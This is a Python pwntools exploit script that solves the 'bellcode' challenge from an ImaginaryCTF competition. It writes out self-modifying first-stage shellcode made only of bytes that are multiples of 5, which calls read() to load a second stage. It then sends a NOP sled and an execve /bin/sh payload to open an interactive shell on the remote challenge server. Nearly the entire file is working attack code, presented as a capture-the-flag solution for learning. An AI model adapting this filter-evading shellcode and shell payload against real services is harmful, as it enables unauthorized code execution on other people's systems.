#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'info'

exe = ELF('./bellcode')

host, port = "bellcode.chal.imaginaryctf.org", "1337"

if args.REMOTE:
  p = remote(host,port)
else:
  p = process(exe.path)

# so we need a shellcode with only values that are multiple of 5
# like this
payload = '\x14\xff'	# adc al,#0xff
payload += '\x00\x05\x00\x00\x00\x00\x5f'  # pop rsi
payload += '\x00\x05\x00\x00\x00\x00\x5f'  # pop rsi
payload += '\x00\x05\x00\x00\x00\x00\x5f'  # pop rsi
payload += '\x5f'*1  # pop rdi
payload += '\x00\x05\x00\x00\x00\x00\xb9\x00\x00\x00\x00'  # mov eax, 0
payload += '\x0f\x05' # syscall

# basically we get use self modifying code to modify instructions, to be in the allowed values
# so,  we do: 3 x pop rsi  to get back our shellcode mapping address in rsi
# we do a pop rdi, to set rdi to zero
# we set eax = 0
# then a syscall,  that will do a    read(0, address, size)  and will read second stage shellcode
#
# which translate in assembly to this:
shellc = asm('''
  adc al,0xff		// set al = 0xff
  add byte[rip],al	// decrement next opcode byte
  pop rdi		// this will be changed to pop rsi by the previous instruction
  add byte[rip],al	// decrement next opcode byte
  pop rdi               // this will be changed to pop rsi by the previous instruction
  add byte[rip],al	// decrement next opcode byte
  pop rdi               // this will be changed to pop rsi by the previous instruction
  pop rdi		// this one is really pop rdi
  add byte[rip],al	// decrement next opcode byte
  .byte 0xb9,0,0,0,0	// will be changed to mov eax,0
  syscall
''')


p.sendlineafter('shellcode?\n', shellc)

# send second stage payload, with pwntools execve shell
p.send('\x90'*0x100+asm(shellcraft.sh()))

p.interactive()

